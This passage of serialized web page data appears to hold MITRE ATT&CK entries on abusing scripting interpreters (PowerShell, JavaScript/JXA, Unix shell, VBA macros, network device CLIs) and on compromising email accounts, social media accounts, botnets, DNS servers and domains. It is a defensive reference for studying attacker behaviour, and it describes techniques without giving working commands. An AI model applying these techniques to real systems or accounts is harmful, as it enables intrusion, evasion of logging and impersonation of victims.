href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F006'\u003EPython\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.mcafee.com\u002Fblogs\u002Fother-blogs\u002Fmcafee-labs\u002Fmacro-malware-targets-macs\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";lR.external_references=[{source_name:b,external_id:lS,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F002"},{source_name:"Apple AppleScript",url:"https:\u002F\u002Fdeveloper.apple.com\u002Flibrary\u002Farchive\u002Fdocumentation\u002FAppleScript\u002FConceptual\u002FAppleScriptLangGuide\u002Fintroduction\u002FASLR_intro.html",description:"Apple. (2016, January 25). Introduction to AppleScript Language Guide. Retrieved March 28, 2020."},{source_name:"SentinelOne AppleScript",url:"https:\u002F\u002Fwww.sentinelone.com\u002Fblog\u002Fhow-offensive-actors-use-applescript-for-attacking-macos\u002F",description:"Phil Stokes. (2020, March 16). How Offensive Actors Use AppleScript For Attacking macOS. Retrieved July 17, 2020."},{source_name:lT,url:lU,description:lV},{url:"https:\u002F\u002Fwww.mcafee.com\u002Fblogs\u002Fother-blogs\u002Fmcafee-labs\u002Fmacro-malware-targets-macs\u002F",description:"Yerko Grbic. (2017, February 14). Macro Malware Targets Macs. Retrieved July 8, 2017.",source_name:"Macro Malware Targets Macs"}];lR["subtechnique-of"]=O;lW.id=lX;lW["object-type"]=a;lW.name="JavaScript";lW.description="Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fnodejs.org\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1559\u002F001'\u003EComponent Object Model\u003C\u002Fa\u003E and Internet Explorer HTML Application (HTA) pages.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fwindows\u002Fwin32\u002Fcom\u002Ftranslating-to-jscript'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Farchive\u002Fblogs\u002Fgauravseth\u002Fthe-world-of-jscript-javascript-ecmascript'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fscripting\u002Fwinscript\u002Fwindows-script-interfaces'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple’s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple’s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple’s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F002'\u003EAppleScript\u003C\u002Fa\u003E. Scripts can be executed via the command line utility \u003Ccode\u003Eosascript\u003C\u002Fcode\u003E, they can be compiled into applications or script files via \u003Ccode\u003Eosacompile\u003C\u002Fcode\u003E, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdeveloper.apple.com\u002Flibrary\u002Farchive\u002Fdocumentation\u002FLanguagesUtilities\u002FConceptual\u002FMacAutomationScriptingGuide\u002Findex.html'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fposts.specterops.io\u002Fpersistent-jxa-66e1c3cd1cf5'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.sentinelone.com\u002Fblog\u002Fmacos-red-team-calling-apple-apis-without-building-binaries\u002F'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fredcanary.com\u002Fblog\u002Fclipping-silver-sparrows-wings\u002F'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.mdsec.co.uk\u002F2021\u002F01\u002Fmacos-post-exploitation-shenanigans-with-vscode-extensions\u002F'\u003E[9]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1189'\u003EDrive-by Compromise\u003C\u002Fa\u003E or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1027'\u003EObfuscated Files or Information\u003C\u002Fa\u003E.";lW.external_references=[{source_name:b,external_id:lX,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F007"},{source_name:"NodeJS",url:"https:\u002F\u002Fnodejs.org\u002F",description:"OpenJS Foundation. (n.d.). Node.js. Retrieved June 23, 2020."},{source_name:"JScrip May 2018",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fwindows\u002Fwin32\u002Fcom\u002Ftranslating-to-jscript",description:"Microsoft. (2018, May 31). Translating to JScript. Retrieved June 23, 2020."},{source_name:"Microsoft JScript 2007",url:"https:\u002F\u002Fdocs.microsoft.com\u002Farchive\u002Fblogs\u002Fgauravseth\u002Fthe-world-of-jscript-javascript-ecmascript",description:"Microsoft. (2007, August 15). The World of JScript, JavaScript, ECMAScript …. Retrieved June 23, 2020."},{source_name:"Microsoft Windows Scripts",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fscripting\u002Fwinscript\u002Fwindows-script-interfaces",description:"Microsoft. (2017, January 18). Windows Script Interfaces. Retrieved June 23, 2020."},{source_name:"Apple About Mac Scripting 2016",url:"https:\u002F\u002Fdeveloper.apple.com\u002Flibrary\u002Farchive\u002Fdocumentation\u002FLanguagesUtilities\u002FConceptual\u002FMacAutomationScriptingGuide\u002Findex.html",description:"Apple. (2016, June 13). About Mac Scripting. Retrieved April 14, 2021."},{source_name:"SpecterOps JXA 2020",url:lY,description:"Pitt, L. (2020, August 6). Persistent JXA. Retrieved April 14, 2021."},{source_name:lT,url:lU,description:lV},{source_name:"Red Canary Silver Sparrow Feb2021",url:"https:\u002F\u002Fredcanary.com\u002Fblog\u002Fclipping-silver-sparrows-wings\u002F",description:"Tony Lambert. (2021, February 18). Clipping Silver Sparrow’s wings: Outing macOS malware before it takes flight. Retrieved April 20, 2021."},{source_name:"MDSec macOS JXA and VSCode",url:"https:\u002F\u002Fwww.mdsec.co.uk\u002F2021\u002F01\u002Fmacos-post-exploitation-shenanigans-with-vscode-extensions\u002F",description:"Dominic Chell. (2021, January 1). macOS Post-Exploitation Shenanigans with VSCode Extensions. Retrieved April 20, 2021."}];lW["subtechnique-of"]=O;lZ.id=l_;lZ["object-type"]=a;lZ.name="Network Device CLI";lZ.description="Adversaries may abuse scripting or built-in command line interpreters (CLI) on network devices to execute malicious command and payloads. The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. CLIs typically contain various permission levels required for different commands. \n\nScripting interpreters automate tasks and extend functionality beyond the command set included in the network OS. The CLI and scripting interpreter are accessible through a direct console connection, or through remote means, such as telnet or secure shell (SSH).\n\nAdversaries can use the network CLI to change how network devices behave and operate. The CLI may be used to manipulate traffic flows to intercept or manipulate data, modify startup configuration parameters to load malicious system software, or to disable security features or logging to avoid detection. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblogs.cisco.com\u002Fsecurity\u002Fevolution-of-attacks-on-cisco-ios-devices'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";lZ.external_references=[{source_name:b,external_id:l_,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F008"},{source_name:ap,url:aq,description:ar},{source_name:l$,url:ma,description:mb}];lZ["subtechnique-of"]=O;mc.id=md;mc["object-type"]=a;mc.name="PowerShell";mc.description="Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. \u003Csup\u003E\u003Ca href='https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Fscriptcenter\u002Fdd742419.aspx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the \u003Ccode\u003EStart-Process\u003C\u002Fcode\u003E cmdlet which can be used to run an executable and the \u003Ccode\u003EInvoke-Command\u003C\u002Fcode\u003E cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0363'\u003EEmpire\u003C\u002Fa\u003E,  \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0194'\u003EPowerSploit\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0378'\u003EPoshC2\u003C\u002Fa\u003E, and PSAttack.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fjaredhaight\u002FPSAttack'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nPowerShell commands\u002Fscripts can also be executed without directly invoking the \u003Ccode\u003Epowershell.exe\u003C\u002Fcode\u003E binary through interfaces to PowerShell's underlying \u003Ccode\u003ESystem.Management.Automation\u003C\u002Fcode\u003E assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI). \u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.sixdub.net\u002F?p=367'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsilentbreaksecurity.com\u002Fpowershell-jobs-without-powershell-exe\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblogs.msdn.microsoft.com\u002Fkebab\u002F2014\u002F04\u002F28\u002Fexecuting-powershell-scripts-from-c\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";mc.external_references=[{source_name:b,external_id:md,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F001"},{url:"https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Fscriptcenter\u002Fdd742419.aspx",description:"Microsoft. (n.d.). Windows PowerShell Scripting. Retrieved April 28, 2016.",source_name:"TechNet PowerShell"},{url:"https:\u002F\u002Fgithub.com\u002Fjaredhaight\u002FPSAttack",description:"Haight, J. (2016, April 21). PS\u003EAttack. Retrieved June 1, 2016.",source_name:"Github PSAttack"},{source_name:"Sixdub PowerPick Jan 2016",url:"http:\u002F\u002Fwww.sixdub.net\u002F?p=367",description:"Warner, J.. (2015, January 6). Inexorable PowerShell – A Red Teamer’s Tale of Overcoming Simple AppLocker Policies. Retrieved December 8, 2018."},{source_name:"SilentBreak Offensive PS Dec 2015",url:"https:\u002F\u002Fsilentbreaksecurity.com\u002Fpowershell-jobs-without-powershell-exe\u002F",description:"Christensen, L.. (2015, December 28). The Evolution of Offensive PowerShell Invocation. Retrieved December 8, 2018."},{source_name:"Microsoft PSfromCsharp APR 2014",url:"https:\u002F\u002Fblogs.msdn.microsoft.com\u002Fkebab\u002F2014\u002F04\u002F28\u002Fexecuting-powershell-scripts-from-c\u002F",description:"Babinec, K. (2014, April 28). Executing PowerShell scripts from C#. Retrieved April 22, 2019."},{url:me,description:mf,source_name:mg},{url:"https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2016\u002F02\u002Fgreater_visibilityt.html",description:"Dunwoody, M. (2016, February 11). GREATER VISIBILITY THROUGH POWERSHELL LOGGING. Retrieved February 16, 2016.",source_name:"FireEye PowerShell Logging 2016"}];mc["subtechnique-of"]=O;mh.id=mi;mh["object-type"]=a;mh.name="Python";mh.description="Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting\u002Fprogramming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the \u003Ccode\u003Epython.exe\u003C\u002Fcode\u003E interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I\u002FO. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.";mh.external_references=[{source_name:b,external_id:mi,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F006"}];mh["subtechnique-of"]=O;mj.id=mk;mj["object-type"]=a;mj.name="Unix Shell";mj.description="Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution.\u003Csup\u003E\u003Ca href='https:\u002F\u002Flinux.die.net\u002Fman\u002F1\u002Fbash'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsupport.apple.com\u002FHT208050'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.\n\nUnix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1021\u002F004'\u003ESSH\u003C\u002Fa\u003E. Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.";mj.external_references=[{source_name:b,external_id:mk,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F004"},{source_name:"DieNet Bash",url:"https:\u002F\u002Flinux.die.net\u002Fman\u002F1\u002Fbash",description:"die.net. (n.d.). bash(1) - Linux man page. Retrieved June 12, 2020."},{source_name:"Apple ZShell",url:"https:\u002F\u002Fsupport.apple.com\u002FHT208050",description:"Apple. (2020, January 28). Use zsh as the default shell on your Mac. Retrieved June 12, 2020."}];mj["subtechnique-of"]=O;ml.id=mm;ml["object-type"]=a;ml.name="Visual Basic";ml.description="Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1559\u002F001'\u003EComponent Object Model\u003C\u002Fa\u003E and the \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1106'\u003ENative API\u003C\u002Fa\u003E through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdevblogs.microsoft.com\u002Fvbteam\u002Fvisual-basic-support-planned-for-net-5-0\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fdotnet\u002Fvisual-basic\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Foffice\u002Fvba\u002Fapi\u002Foverview\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FVisual_Basic_for_Applications'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F007'\u003EJavaScript\u003C\u002Fa\u003E on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fprevious-versions\u002F\u002F1kw29xwf(v=vs.85)'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566\u002F001'\u003ESpearphishing Attachment\u003C\u002Fa\u003E payloads.";ml.external_references=[{source_name:b,external_id:mm,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F005"},{source_name:"VB .NET Mar 2020",url:"https:\u002F\u002Fdevblogs.microsoft.com\u002Fvbteam\u002Fvisual-basic-support-planned-for-net-5-0\u002F",description:".NET Team. (2020, March 11). Visual Basic support planned for .NET 5.0. Retrieved June 23, 2020."},{source_name:"VB Microsoft",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fdotnet\u002Fvisual-basic\u002F",description:"Microsoft. (n.d.). Visual Basic documentation. Retrieved June 23, 2020."},{source_name:"Microsoft VBA",url:"https:\u002F\u002Fdocs.microsoft.com\u002Foffice\u002Fvba\u002Fapi\u002Foverview\u002F",description:"Microsoft. (2019, June 11). Office VBA Reference. Retrieved June 23, 2020."},{source_name:"Wikipedia VBA",url:"https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FVisual_Basic_for_Applications",description:"Wikipedia. (n.d.). Visual Basic for Applications. Retrieved August 13, 2020."},{source_name:"Microsoft VBScript",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fprevious-versions\u002F\u002F1kw29xwf(v=vs.85)",description:"Microsoft. (2011, April 19). What Is VBScript?. Retrieved March 28, 2020."}];ml["subtechnique-of"]=O;mn.id=mo;mn["object-type"]=a;mn.name="Windows Command Shell";mn.description="Adversaries may abuse the Windows command shell for execution. The Windows command shell (\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0106'\u003Ecmd\u003C\u002Fa\u003E) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. \n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0106'\u003Ecmd\u003C\u002Fa\u003E to execute various commands and payloads. Common uses include \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0106'\u003Ecmd\u003C\u002Fa\u003E to execute a single command, or abusing \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0106'\u003Ecmd\u003C\u002Fa\u003E interactively with input and output forwarded over a command and control channel.";mn.external_references=[{source_name:b,external_id:mo,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F003"}];mn["subtechnique-of"]=O;mK.id=mL;mK["object-type"]=a;mK.name=mM;mK.description="Adversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conduct \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566'\u003EPhishing\u003C\u002Fa\u003E. Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583\u002F001'\u003EDomains\u003C\u002Fa\u003E).\n\nA variety of methods exist for compromising email accounts, such as gathering credentials via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E, purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).\u003Csup\u003E\u003Ca href='https:\u002F\u002Farstechnica.com\u002Ftech-policy\u002F2011\u002F02\u002Fanonymous-speaks-the-inside-story-of-the-hbgary-hack\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Prior to compromising email accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\n\nAdversaries can use a compromised email account to hijack existing email threads with targets of interest.";mK.external_references=[{source_name:b,external_id:mL,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1586\u002F002"},{source_name:eq,description:er,url:es}];mK["subtechnique-of"]=cp;mN.id=mO;mN["object-type"]=a;mN.name=mP;mN.description="Adversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1585\u002F001'\u003ESocial Media Accounts\u003C\u002Fa\u003E), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. \n\nA variety of methods exist for compromising social media accounts, such as gathering credentials via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E, purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).\u003Csup\u003E\u003Ca href='https:\u002F\u002Farstechnica.com\u002Ftech-policy\u002F2011\u002F02\u002Fanonymous-speaks-the-inside-story-of-the-hbgary-hack\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Prior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\n\nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.\n\nAdversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.securityweek.com\u002Firanian-hackers-targeted-us-officials-elaborate-social-media-attack-operation'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='http:\u002F\u002Fmedia.blackhat.com\u002Fbh-us-10\u002Fwhitepapers\u002FRyan\u002FBlackHat-USA-2010-Ryan-Getting-In-Bed-With-Robin-Sage-v1.0.pdf'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Compromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566\u002F003'\u003ESpearphishing via Service\u003C\u002Fa\u003E).";mN.external_references=[{source_name:b,external_id:mO,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1586\u002F001"},{source_name:eq,description:er,url:es},{source_name:et,description:eu,url:ev},{source_name:ew,description:ex,url:ey}];mN["subtechnique-of"]=cp;m_.id=m$;m_["object-type"]=a;m_.name=iZ;m_.description="Adversaries may compromise numerous third-party systems to form a botnet that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fus.norton.com\u002Finternetsecurity-malware-what-is-a-botnet.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Instead of purchasing\u002Frenting a botnet from a booter\u002Fstresser service\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.imperva.com\u002Flearn\u002Fddos\u002Fbooters-stressers-ddosers\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E, adversaries may build their own botnet by compromising numerous third-party systems. Adversaries may also conduct a takeover of an existing botnet, such as redirecting bots to adversary-controlled C2 servers.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.secureworks.com\u002Fresearch\u002Fdridex-bugat-v5-botnet-takeover-operation'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566'\u003EPhishing\u003C\u002Fa\u003E or Distributed Denial of Service (DDoS).";m_.external_references=[{source_name:b,external_id:m$,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1584\u002F005"},{source_name:i_,url:i$,description:ja},{source_name:jb,url:jc,description:jd},{source_name:"Dell Dridex Oct 2015",url:"https:\u002F\u002Fwww.secureworks.com\u002Fresearch\u002Fdridex-bugat-v5-botnet-takeover-operation",description:"Dell SecureWorks Counter Threat Unit Threat Intelligence. (2015, October 13). Dridex (Bugat v5) Botnet Takeover Operation. Retrieved May 31, 2019."}];m_["subtechnique-of"]=Z;na.id=nb;na["object-type"]=a;na.name=jg;na.description="Adversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1071'\u003EApplication Layer Protocol\u003C\u002Fa\u003E). Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.\n\nBy compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.talosintelligence.com\u002F2018\u002F11\u002Fdnspionage-campaign-targets-middle-east.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2019\u002F01\u002Fglobal-dns-hijacking-campaign-dns-record-manipulation-at-scale.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblogs.cisco.com\u002Fsecurity\u002Ftalos\u002Fangler-domain-shadowing'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.proofpoint.com\u002Fus\u002Fthreat-insight\u002Fpost\u002FThe-Shadow-Knows'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";na.external_references=[{source_name:b,external_id:nb,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1584\u002F002"},{source_name:mU,url:mV,description:mW},{source_name:"FireEye DNS Hijack 2019",url:"https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2019\u002F01\u002Fglobal-dns-hijacking-campaign-dns-record-manipulation-at-scale.html",description:"Hirani, M., Jones, S., Read, B. (2019, January 10). Global DNS Hijacking Campaign: DNS Record Manipulation at Scale. Retrieved October 9, 2020."},{source_name:"CiscoAngler",description:"Nick Biasini. (2015, March 3). Threat Spotlight: Angler Lurking in the Domain Shadows. Retrieved March 6, 2017.",url:"https:\u002F\u002Fblogs.cisco.com\u002Fsecurity\u002Ftalos\u002Fangler-domain-shadowing"},{source_name:"Proofpoint Domain Shadowing",url:"https:\u002F\u002Fwww.proofpoint.com\u002Fus\u002Fthreat-insight\u002Fpost\u002FThe-Shadow-Knows",description:"Proofpoint Staff. (2015, December 15). The shadow knows: Malvertising campaigns use domain shadowing to pull in Angler EK. Retrieved October 16, 2020."}];na["subtechnique-of"]=Z;nc.id=nd;nc["object-type"]=a;nc.name=jj;nc.description="Adversaries may hijack domains and\u002For subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.icann.org\u002Fgroups\u002Fssac\u002Fdocuments\u002Fsac-007-en'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E An adversary may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account or taking advantage of renewal process gaps.\n\nSubdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fazure\u002Fsecurity\u002Ffundamentals\u002Fsubdomain-takeover'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";nc.external_references=[{source_name:b,external_id:nd,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1584\u002F001"},{source_name:mR,description:mS,url:mT},{source_name:"Microsoft Sub Takeover 2020",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fazure\u002Fsecurity\u002Ffundamentals\u002Fsubdomain-takeover",description:"Microsoft. (2020, September 29). Prevent dangling 